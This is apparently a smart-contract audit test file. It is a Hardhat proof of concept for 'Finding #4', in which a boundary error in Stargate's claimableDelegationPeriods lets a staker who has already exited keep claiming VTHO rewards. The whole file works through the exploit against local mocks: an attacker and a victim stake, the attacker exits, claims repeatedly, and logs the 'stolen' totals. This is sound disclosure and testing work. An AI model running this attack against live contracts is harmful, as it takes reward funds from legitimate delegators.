import { expect } from "chai";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../../typechain-types";
import { getOrDeployContracts } from "../../helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { TransactionResponse } from "ethers";

describe("Finding #4: Post-Exit Reward Claim Exploit", () => {
    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let deployer: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    let victim: HardhatEthersSigner;
    let validator: HardhatEthersSigner;
    let tx: TransactionResponse;
    let vthoTokenContract: MyERC20;

    const LEVEL_ID = 1;
    const VALIDATOR_STATUS_ACTIVE = 2;

    beforeEach(async () => {
        const config = createLocalConfig();
        [deployer] = await ethers.getSigners();

        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(deployer.address, deployer.address);
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        config.MAX_CLAIMABLE_PERIODS = 100;
        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);

        attacker = contracts.otherAccounts[0];
        victim = contracts.otherAccounts[1];
        validator = contracts.otherAccounts[2];

        tx = await protocolStakerMock.addValidation(validator.address, 120);
        await tx.wait();
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        tx = await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_ACTIVE);
        await tx.wait();

        tx = await stargateNFTMock.helper__setLevel({
            id: LEVEL_ID,
            name: "TestLevel",
            isX: false,
            maturityBlocks: 10,
            scaledRewardFactor: 100,
            vetAmountRequiredToStake: ethers.parseEther("1"),
        });
        await tx.wait();

        tx = await vthoTokenContract.connect(deployer).mint(stargateContract, ethers.parseEther("1000000"));
        await tx.wait();
    });

    it("Attacker exploits boundary bug to claim infinite post-exit rewards", async () => {
        const stakeAmount = ethers.parseEther("1");
        
        console.log("\n=== Setup Phase ===");
        
        // Setup: Attacker and victim both stake and delegate
        tx = await stargateContract.connect(attacker).stake(LEVEL_ID, { value: stakeAmount });
        await tx.wait();
        const attackerTokenId = await stargateNFTMock.getCurrentTokenId();
        console.log("Attacker staked and got tokenId:", attackerTokenId.toString());
        
        tx = await stargateNFTMock.helper__setToken({
            tokenId: attackerTokenId,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: stakeAmount,
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();
        tx = await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock);
        await tx.wait();
        tx = await stargateContract.connect(attacker).delegate(attackerTokenId, validator.address);
        await tx.wait();

        tx = await stargateContract.connect(victim).stake(LEVEL_ID, { value: stakeAmount });
        await tx.wait();
        const victimTokenId = await stargateNFTMock.getCurrentTokenId();
        console.log("Victim staked and got tokenId:", victimTokenId.toString());
        
        tx = await stargateNFTMock.helper__setToken({
            tokenId: victimTokenId,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: stakeAmount,
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();
        tx = await stargateContract.connect(victim).delegate(victimTokenId, validator.address);
        await tx.wait();
        console.log("Both users delegated to validator\n");

        // Validator completes 5 periods
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5);
        await tx.wait();

        console.log("=== Attacker Exits ===");
        // Attacker exits delegation
        tx = await stargateContract.connect(attacker).requestDelegationExit(attackerTokenId);
        await tx.wait();
        
        const attackerDelegationId = await stargateContract.getDelegationIdOfToken(attackerTokenId);
        const [, attackerEndPeriod] = await protocolStakerMock.getDelegationPeriodDetails(attackerDelegationId);
        console.log("Attacker exited. endPeriod:", attackerEndPeriod.toString());

        // Exit completes at period 6
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 6);
        await tx.wait();

        console.log("\n=== Legitimate Claim ===");
        // Attacker claims legitimate rewards up to endPeriod
        const balanceBeforeLegitClaim = await vthoTokenContract.balanceOf(attacker.address);
        console.log("Attacker VTHO balance before:", ethers.formatEther(balanceBeforeLegitClaim));
        
        tx = await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await tx.wait();
        const balanceAfterLegitClaim = await vthoTokenContract.balanceOf(attacker.address);
        const legitimateClaim = balanceAfterLegitClaim - balanceBeforeLegitClaim;
        
        console.log("Attacker VTHO balance after:", ethers.formatEther(balanceAfterLegitClaim));
        console.log("Legitimate claim amount:", ethers.formatEther(legitimateClaim), "VTHO");

        // Validator advances to period 10 (attacker should NOT be able to claim 7-10)
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 10);
        await tx.wait();
        console.log("\n=== Exploit: Post-Exit Claim ===");
        console.log("Validator advanced to period 10");

        // Bug: claimableDelegationPeriods returns post-exit periods due to boundary error
        const [firstClaimable, lastClaimable] = await stargateContract.claimableDelegationPeriods(attackerTokenId);
        console.log("Bug triggered! claimableDelegationPeriods returns:", firstClaimable.toString(), "to", lastClaimable.toString());
        console.log("(Should return 0, 0 since attacker exited at period", attackerEndPeriod.toString(), ")");
        
        // Verify bug triggers: attacker can claim periods after exit
        expect(firstClaimable).to.be.greaterThan(attackerEndPeriod, 
            "Bug should allow claiming periods > endPeriod");
        expect(lastClaimable).to.be.greaterThan(attackerEndPeriod,
            "Bug should return lastClaimable > endPeriod");

        // Execute exploit: claim post-exit rewards
        const balanceBeforeExploit = await vthoTokenContract.balanceOf(attacker.address);
        console.log("\nAttacker VTHO before exploit:", ethers.formatEther(balanceBeforeExploit));
        
        tx = await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await tx.wait();
        const balanceAfterExploit = await vthoTokenContract.balanceOf(attacker.address);
        const stolenAmount = balanceAfterExploit - balanceBeforeExploit;

        console.log("Attacker VTHO after exploit:", ethers.formatEther(balanceAfterExploit));
        console.log("Stolen amount (periods 7-10):", ethers.formatEther(stolenAmount), "VTHO");
        
        // Verify theft occurred
        expect(stolenAmount).to.be.greaterThan(0, "Attacker should steal VTHO from post-exit periods");

        // Verify repeatability: advance to period 15 and claim again
        console.log("\n=== Repeatability Test ===");
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 15);
        await tx.wait();
        console.log("Validator advanced to period 15");
        
        const [firstClaimable2, lastClaimable2] = await stargateContract.claimableDelegationPeriods(attackerTokenId);
        console.log("New claimable periods:", firstClaimable2.toString(), "to", lastClaimable2.toString());
        expect(firstClaimable2).to.be.greaterThan(0, "Exploit should be repeatable");
        expect(lastClaimable2).to.be.greaterThan(lastClaimable, "New periods should be claimable");

        const balanceBefore2 = await vthoTokenContract.balanceOf(attacker.address);
        console.log("\nAttacker VTHO before 2nd exploit:", ethers.formatEther(balanceBefore2));
        
        tx = await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await tx.wait();
        const balanceAfter2 = await vthoTokenContract.balanceOf(attacker.address);
        const stolenAmount2 = balanceAfter2 - balanceBefore2;

        console.log("Attacker VTHO after 2nd exploit:", ethers.formatEther(balanceAfter2));
        console.log("Stolen amount (periods 11-15):", ethers.formatEther(stolenAmount2), "VTHO");
        
        expect(stolenAmount2).to.be.greaterThan(0, "Second theft should succeed (infinite exploit)");

        // Calculate total profit
        const totalStolen = balanceAfter2 - balanceBeforeLegitClaim - legitimateClaim;
        const totalClaimed = balanceAfter2 - balanceBeforeLegitClaim;

        console.log("\n=== Economic Impact ===");
        console.log("Legitimate rewards:", ethers.formatEther(legitimateClaim), "VTHO");
        console.log("Total stolen (post-exit):", ethers.formatEther(totalStolen), "VTHO");
        console.log("Total claimed:", ethers.formatEther(totalClaimed), "VTHO");
        console.log("Attack cost: ~0.01 VET (gas only, stake recoverable)");
        console.log("ROI: Infinite (can repeat until validator exits)\n");

        // Economic impact: attacker steals with near-zero cost (only gas)
        expect(totalStolen).to.be.greaterThan(0);
        expect(totalClaimed).to.be.greaterThan(legitimateClaim);
        
        // Invariant violation: sum(attacker claims) > attacker's entitled share
        // Since attacker exited at period 6, periods 7-15 should go 100% to victim
        // But attacker steals from these periods with no active stake
    });
});

